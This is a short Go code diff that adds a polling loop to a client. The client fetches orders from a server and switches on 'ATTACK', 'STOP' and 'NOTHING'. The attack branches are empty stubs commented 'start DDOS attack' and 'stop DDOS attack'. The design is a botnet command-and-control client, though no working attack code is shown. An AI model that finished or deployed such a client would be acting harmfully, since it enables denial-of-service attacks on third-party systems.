@@ -8,6 +8,12 @@ import (
 	"sync"
 )
 
+const (
+	ATTACK  = "ATTACK"
+	STOP    = "STOP"
+	NOTHING = "NOTHING"
+)
+
 var instance *Client
 var once sync.Once
 
@@ -97,4 +103,26 @@ func (c *Client) Ping() (interface{}, error) {
 
 func (c *Client) ReceiveOrder() (interface{}, error) {
 	return c.Get("/order")
+}
+
+func (c *Client) ListenToOrders() {
+	for {
+		order, err := c.ReceiveOrder()
+		if err != nil {
+			panic(err)
+		}
+		if order == ATTACK {
+			// start DDOS attack
+		}
+		if order == STOP {
+			// stop DDOS attack
+		}
+		if order == NOTHING {
+			// do nothing
+		}
+	}
+}
+
+func (c *Client) LeaveCamp() (interface{}, error) {
+	return c.Get("/leave")
 }
